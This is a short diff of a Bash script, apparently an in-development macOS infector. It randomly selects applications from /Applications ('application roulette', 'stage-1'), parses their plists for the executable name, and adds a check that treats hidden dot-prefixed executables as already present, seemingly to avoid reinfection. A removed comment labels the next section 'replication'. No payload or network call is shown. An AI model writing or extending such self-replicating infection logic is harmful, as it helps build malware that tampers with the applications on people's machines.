@@ -10,7 +10,8 @@ fi
 #It appears that some plists are gibberish for some reason, they can be identified 
 #by ${ExecLineNum} having a value of 1 (after let adding one to its value)
 IsReadablePlist="false"
-while [ ${IsReadablePlist} == "false" ]
+IsAlreadyPresent="false"
+while [ ${IsReadablePlist} == "false" -a ${IsAlreadyPresent} == "false" ] 
 do
 	#Application roulette; coppied from stage-1-old:
 	loc=(/Applications/*)
@@ -45,7 +46,15 @@ do
 			echo "TmpName is ${TmpName}"
 			echo "ExecName is ${ExecName}"
 		fi
+		#If ${ExecName} starts with a . (aka is hidden) then repeat this loop
+		if [[ ${ExecName} = .* ]]
+		then
+			if [ ${DEBUG} == 1 ]
+			then
+				echo "IsAlreadyPresent == true"
+			fi
+			IsAlreadyPresent="true"
+		fi
 		IsReadablePlist="true"
 	fi
 done
-#Section two: replication
